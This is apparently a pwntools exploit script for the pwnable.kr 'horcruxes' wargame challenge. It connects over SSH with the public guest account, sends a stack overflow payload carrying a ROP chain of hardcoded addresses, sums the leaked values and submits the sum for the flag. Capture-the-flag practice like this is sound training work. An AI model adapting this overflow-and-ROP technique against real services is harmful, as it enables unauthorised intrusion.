from pwn import *
from struct import pack
import re

shell = ssh("horcruxes", "pwnable.kr", 2222, "guest")
conn = shell.connect_remote("localhost", 9032)

data = conn.recvuntil(":").decode("ascii")
print(data)

conn.sendline("0")
data = conn.recvuntil(":").decode("ascii")
print(data)

dummybyte = ("A" * 0x78).encode()
returnaddr = pack("<I", 0x0809fe4b)
returnaddr += pack("<I", 0x0809FE6A)
returnaddr += pack("<I", 0x0809FE89)
returnaddr += pack("<I", 0x0809FEA8)
returnaddr += pack("<I", 0x0809FEC7)
returnaddr += pack("<I", 0x0809FEE6)
returnaddr += pack("<I", 0x0809FF05)
returnaddr += pack("<I", 0x0809FFFC)

conn.sendline(dummybyte + returnaddr)
conn.recvline()

sum = 0

for func_i in range(0,7):
  data = conn.recvline(')').decode("ascii").replace("\n", ";")
  print( str(func_i) + " = " + str(data))
  sum += int(re.search('EXP \+([-0-9]+)\)', data).group(1), 10)
  print("sum = " + str(sum))



data = conn.recvuntil(":").decode("ascii")
print(data)
conn.sendline("0")

data = conn.recvuntil(":").decode("ascii")
print(data)

conn.sendline(str(sum))
#conn.recvline()


#data = conn.recvuntil(":").decode("ascii")
#print(data)
data = conn.recvline().decode("ascii")
print(data)

#data = conn.recvline().decode("ascii")
#print(data)

#data = conn.recvline()
#print(data.decode("ascii"))

#total = 0

#for i in range(0,7):
#    conn.recvuntil('EXP +')
#    total += int(conn.recvuntil(')')[:-1])
#    log.info('total = ' + str(total))

#return to function 'ROPME'
#conn.recvuntil("Menu:")
#conn.sendline("0")
#conn.recvuntil("earned? : ")
#conn.sendline(str(total))

#log.info("flag is : " + n.recv())
